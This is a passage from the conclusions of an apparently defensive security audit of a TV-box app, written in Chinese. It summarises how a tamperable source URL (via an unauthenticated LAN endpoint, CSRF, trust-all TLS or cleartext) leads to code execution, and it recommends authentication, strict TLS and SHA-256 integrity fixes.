1. **该项目最大的结构性风险是"信任边界完全外置"**：三套代码加载通道（jar/jsapi/JS/Python）的信任锚全部落在"用户配置的接口 URL"上，而该 URL 本身可被局域网未认证的 `/action` 接口（H-1）或 CSRF（M-1）或 Trust-All TLS（H-2）或明文链路（M-5）篡改——四条路径中任何一条成立，最终都收敛为应用进程内任意代码执行。修复必须**从信任锚（认证 + TLS + 完整性）入手**，单独修补某个端点（如继续加路径校验）无法阻断主链。
2. **部分加固已具备良好基础**：路径穿越、Zip Slip、环回区分、SSRF fail-closed、python 侧证书严格校验等已落地，说明代码库具备快速吸收安全修复的能力；H 级三条的修复（Token 认证、默认严格 TLS、SHA-256 必填）改动面集中在 `RemoteServer`/`OkHttp`/`OkGoHelper`/`JarLoader` 四个文件，工程成本可控。
3. **TV 盒子场景评估**：家庭局域网内"可信家庭网络"的假设在公共 Wi-Fi、合租、被入侵路由器、恶意邻居设备等场景下不成立；且本应用的攻击链无需用户交互（换源后首次使用源即触发下载加载），"学习项目"定位不影响漏洞的客观可利用性，建议按 P0→P1→P2 顺序落地修复。
